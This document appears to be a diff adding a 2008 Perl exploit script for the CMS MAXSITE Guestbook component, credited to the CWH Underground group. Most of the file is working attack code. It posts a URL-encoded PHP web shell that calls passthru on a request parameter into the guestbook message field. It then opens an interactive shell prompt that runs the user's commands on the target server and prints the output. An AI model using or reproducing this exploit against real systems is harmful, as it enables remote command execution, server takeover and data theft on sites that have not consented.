@@ -1,0 +1,118 @@
+#!/usr/bin/perl
+#==================================================================
+# CMS MAXSITE Component Guestbook Remote Command Execution Exploit
+#==================================================================
+#
+#  ,--^----------,--------,-----,-------^--,
+#  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+#  `+---------------------------^----------|
+#    `\_,-------, _________________________|
+#      / XXXXXX /`|     /
+#     / XXXXXX /  `\   /
+#    / XXXXXX /\______(
+#   / XXXXXX /           
+#  / XXXXXX /
+# (________(             
+#  `------'
+#
+#AUTHOR : CWH Underground
+#DATE : 2 December 2008
+#SITE : cwh.citec.us
+#
+#
+#####################################################################
+#APPLICATION : CMS MAXSITE Component Guestbook
+#COMPONENT   : Guestbook
+#DOWNLOAD	 : http://maxsite.geniuscyber.com/download/Ex-guestbook.rar
+#####################################################################
+#
+#
+#####################################################################
+# Greetz      : ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos   
+# Special Thx : asylu3, str0ke, citec.us, milw0rm.com
+#####################################################################
+
+use LWP;
+use HTTP::Request;
+
+my $sis="$^O";if ($sis eq 'MSWin32') { system("cls"); } else { system("clear"); }
+
+print "\n==================================================\n";
+print "    CMS MAXSITE Component Guestbook RCE Exploit \n";
+print " \n";
+print "         Discovered By CWH Underground \n";
+print "==================================================\n";
+print "                                              \n";
+print "  ,--^----------,--------,-----,-------^--,   \n";
+print "  | |||||||||   `--------'     |          O	\n";
+print "  `+---------------------------^----------|   \n";
+print "    `\_,-------, _________________________|   \n";
+print "      / XXXXXX /`|     /                      \n";
+print "     / XXXXXX /  `\   /                       \n";
+print "    / XXXXXX /\______(                        \n";
+print "   / XXXXXX /                                 \n";
+print "  / XXXXXX /   .. CWH Underground Hacking Team ..  \n";
+print " (________(                                   \n";
+print "  `------'                                    \n";
+print "                                              \n";
+
+if ($#ARGV != 0)
+{
+   print "Usage: ./xpl.pl <URL to index page>\n";
+   print "Ex. ./xpl.pl http://www.target.com/maxsite/index.php\n";
+   exit();
+}
+
+$index = $ARGV[0];
+$upload_url = $index."?name=guestbook&file=message";
+
+print "\n[+] Trying to Inject the Code...\n";
+
+$ua = LWP::UserAgent->new ();
+$post = HTTP::Request->new (POST => $upload_url);
+$post->header (User_Agent => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.18) Gecko/20081029 Firefox/2.0.0.18');
+$post->header (Accept => 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5');
+$post->header (Accept_Language => 'en-us,en;q=0.5');
+$post->header (Content_Type => 'application/x-www-form-urlencoded');
+$post->content ('name=CWH&aim=CWH&email=CWH&site=http%3A%2F%2Fcitec.us&message=%3C%3Fphp+%0D%0Aif%28get_magic_quotes_gpc%28%29%29%0D%0A%7B+%0D%0A%09%24_GET%5Bcmd%5D%3Dstripslashes%28%24_GET%5Bcmd%5D%29%3B%0D%0A%7D+%0D%0Aecho+%28%22%23%23%25%24%24%25%23%23%22%29%3B%0D%0Apassthru%28%24_GET%5Bcmd%5D%29%3B+%0D%0Aecho+%28%22%23%23%25%24%24%25%23%23%22%29%3B%0D%0A%3F%3E&submitButtonName=Submit');
+
+$response = $ua->request ($post);
+
+if ($response->code ne 200) {
+	print "\nRCE Exploit Failed\n";
+	exit();
+}
+
+print "\nSuccessfully Inject Code !!!\n\n";
+print "[cwh-shell]# ";
+chomp ($cmd = <STDIN>);
+
+while ($cmd ne "exit") {
+
+	
+	$url = $index."?name=guestbook&cmd=".$cmd;
+
+	$req = HTTP::Request->new (GET => $url);
+	$req->header (User_Agent => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.18) Gecko/20081029 Firefox/2.0.0.18');
+	$req->header (Accept => 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5');
+	$req->header (Accept_Language => 'en-us,en;q=0.5');
+
+	
+	$response = $ua->request ($req);
+	$content = $response->content;
+
+	if ($content !~ /\#\#%\$\$%\#\#/) {
+		print ("Exploit Failed\n");
+		exit();
+	}
+
+	while ($content =~ /\#\#%\$\$%\#\#(.*?)\#\#%\$\$%\#\#/sg) {
+		print $1;
+	}
+
+	print "\n[cwh-shell]# ";
+	chomp ($cmd = <STDIN>);
+
+}
+
+# milw0rm.com [2008-12-02]
